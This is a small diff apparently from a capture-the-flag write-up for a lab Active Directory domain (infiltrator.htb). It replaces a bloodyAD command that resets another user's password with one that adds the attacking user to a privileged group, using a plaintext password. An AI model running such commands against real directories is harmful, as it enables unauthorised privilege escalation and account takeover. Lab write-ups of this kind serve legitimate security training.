@@ -6,6 +6,6 @@ By adding itself to the group, E.RODRIGUEZ@INFILTRATOR.HTB will gain the same pr
 
 
 ```bash
-bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos -u "e.rodriguez" -p 'Password123' set password "m.harris" "Password123"
+bloodyAD --host "dc01.infiltrator.htb" -d "infiltrator.htb" --kerberos -u "e.rodriguez" -p 'Password123' add groupMember "CN=CHIEFS MARKETING,CN=USERS,DC=INFILTRATOR,DC=HTB" e.rodriguez
 ```
 
